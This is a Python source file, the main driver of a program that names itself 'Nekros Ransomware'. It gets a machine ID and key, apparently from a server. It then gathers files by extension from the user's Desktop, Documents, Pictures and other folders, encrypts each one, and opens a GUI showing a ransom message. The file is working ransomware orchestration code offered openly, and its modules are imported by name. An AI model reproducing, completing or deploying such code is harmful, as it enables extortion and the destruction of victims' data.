#!/usr/bin/env python

import threading
import argparse

#Self Written Modules To Perform Various Stages
import stage1, stage2, stage3, reverse_attack

#After Stage Self Written Modules
from after_stage1 import changeWallpaper
from after_stage2 import GUI

class Main:

    def run_stage1(self):
        start_stage1 = stage1.Stage1()  #Making object of Stage1 Class
        unique_machine_id, key = start_stage1.start() #Starting Stage1
        return unique_machine_id, key

    def run_stage2(self, target_extensions, target_directories):
        start_stage2 = stage2.Stage2(target_extensions, target_directories)   #Making object of Stage2 Class
        list_of_files = start_stage2.start()  #Starting Stage1
        return list_of_files

    def run_stage3(self, key, path):
        start_stage3 = stage3.Encryptor(key, path)  #Making object of Encryptor Class  [Main Process]
        start_stage3.encrypt_file() #Starts Encryption Process

    def start_gui(self, machine_id, message):
        GUI.start_gui(machine_id, message)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Nekros Ransomware")
    parser.add_argument('--extensions', nargs='+', default=['.lol', '.mrrobot'],
                        help='List of file extensions to encrypt')
    parser.add_argument('--directories', nargs='+', default=['Desktop', 'Downloads', 'Documents', 'Pictures', 'Music'],
                        help='List of directories to encrypt')
    parser.add_argument('--message', type=str, default="Your files have been encrypted!",
                        help='The ransom message to display in the GUI')
    args = parser.parse_args()

    test = Main()

    print("\n[*] Initiating Stage 1 ...")
    try:
        unique_machine_id, key = test.run_stage1()
    except Exception as e:
        print(f"[!] Unable to Connect to Server! Error: {e}")
        quit()
    print("[+] Completed Successfully!")

    print("\n[*] Initiating Stage 2 ...")
    list_of_files = test.run_stage2(args.extensions, args.directories)
    print("[+] Completed Successfully!")

    print("\n[*] Initiating Stage 3 ...")
    for file in list_of_files:
        test.run_stage3(key, file)
    print("[+] Completed Successfully!")

    print("\n[*] Initiating GUI...")
    t2 = threading.Thread(target=test.start_gui, args=[unique_machine_id, args.message])
    t2.start()
